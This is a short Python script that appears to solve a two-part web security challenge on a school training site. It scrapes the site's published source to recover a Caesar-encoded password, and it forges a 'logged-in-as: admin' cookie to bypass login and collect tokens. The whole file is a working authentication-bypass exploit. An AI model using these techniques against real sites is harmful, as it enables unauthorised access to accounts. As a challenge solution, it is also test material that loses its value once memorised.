import requests
import re

BASE = 'https://whitebox.school-slon.ru/'

def extract_token(response):
    return re.search("Отправь код '(.*)' на почту", response).group(1)

def get_token(**kwargs):
    req = requests.post(BASE, **kwargs)
    if req.history:  # got HTTP 302, which means error
        return None
    return extract_token(req.text)

print('TOKEN 1:')
encoded_pw = re.search("ENCODED_PASSWORD = '(.*)'", requests.get(BASE+'code').text).group(1)
encoding_offset = re.search("ALPHABET.index\(char\) \+ ([0-9]+)", requests.get(BASE+'code').text).group(1)
encoding_offset = int(encoding_offset)

decoded_pw = ''
for symb in encoded_pw:
    symb = ord(symb) - ord('a')
    symb = (symb - encoding_offset) % 26
    symb += ord('a')
    decoded_pw += chr(symb)

print('Password:', decoded_pw)
print('\t', get_token( data={'password': decoded_pw} ))


print()
print('TOKEN 2:')
print('\t', get_token( cookies={'logged-in-as': 'admin'} ))
